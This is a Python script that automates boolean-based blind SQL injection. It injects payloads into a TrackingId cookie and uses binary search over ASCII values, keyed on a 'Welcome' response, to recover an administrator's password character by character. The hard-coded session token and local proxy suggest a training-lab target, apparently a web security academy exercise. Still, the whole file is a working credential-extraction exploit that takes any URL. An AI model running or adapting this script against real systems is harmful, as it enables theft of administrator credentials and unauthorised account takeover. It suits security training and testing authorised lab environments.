import sys
import urllib3
from urllib.parse import quote
import requests
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def greater_than_mid(url, mid, i):
    sqli_payload = "'+and+(select+ASCII(substring(password,%s,1))+from+users+where+username='administrator')>%s--" % (i, mid)
    cookie = {'TrackingId': '0c1loxI1TyIYTJzX' + sqli_payload,
              'session': 'PFyA0zg8zJBKZMnegkrGSTsTajZInLGy'}
    r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
    if "Welcome" in r.text:
        return True
    else:
        return False


def check_mid(url, mid, i):
    sqli_payload = "'+and+(select+ASCII(substring(password,%s,1))+from+users+where+username='administrator')=%s--" % (i, mid)
    cookie = {'TrackingId': '0c1loxI1TyIYTJzX' + sqli_payload,
              'session': 'PFyA0zg8zJBKZMnegkrGSTsTajZInLGy'}
    r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
    if "Welcome" in r.text:
        return True
    else:
        return False


def sqli_password(url):
    password_extracted = ""

    for i in range(1, 21):
        l = 48
        r = 123
        while (l <= r):
            mid = (l + r)//2
            sys.stdout.write('\r' + password_extracted + chr(mid))
            sys.stdout.flush()

            if greater_than_mid(url, mid, i):
                l = mid + 1
            elif check_mid(url, mid, i):
                password_extracted += chr(mid)
                break
            else:
                r = mid - 1

        sys.stdout.write('\r' + password_extracted)
        sys.stdout.flush()


def main():
    start_time = time.time()

    print("\n[+] Retrieving administrator password...")
    sqli_password(url)

    end_time = time.time()
    elapsed_time = end_time - start_time

    print(f"\n\nThe elapsed time is {round(elapsed_time, 2)} seconds.")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        sys.exit(0)

    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Keyboard Interrupt Dectected.")
        print("[-] Exiting...")
